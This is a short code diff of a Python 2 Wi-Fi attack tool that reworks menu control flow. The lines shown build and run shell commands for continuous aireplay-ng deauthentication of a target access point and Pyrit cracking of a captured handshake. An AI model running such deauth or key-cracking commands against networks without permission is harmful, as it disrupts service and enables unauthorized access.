@@ -325,11 +325,9 @@ class AoBWWPSKE:
 					print colored("Give \'next\' command to continue\n", 'green')
 					choice4 = raw_input()
 					if(choice4 == 'next'):
-						continue
-			if (choice == '3'):
-				subprocess.call('Pyrit -r .pcap -i PMK', shell=True)
-
-			subprocess.call(com, shell=True)
+						if (choice == '3'):
+							subprocess.call('Pyrit -r .pcap -i PMK', shell=True)
+							subprocess.call(com, shell=True)
 			print
 			print
 			time.sleep(5)
@@ -588,7 +586,9 @@ class MA:
 				print colored("Give \'next\' command to continue\n", 'green')
 				choices = raw_input()
 				if(choices == 'next'):
-					continue
+					print
+					print
+					time.sleep(5)
 			elif(choice == '2'):
 				print colored("Deauthentication of the target from his access point\n", 'green')
 				com = 'aireplay-ng --deauth 0 -a ' + mac + ' --ignore-negative-one ' + obj.__interfacemon
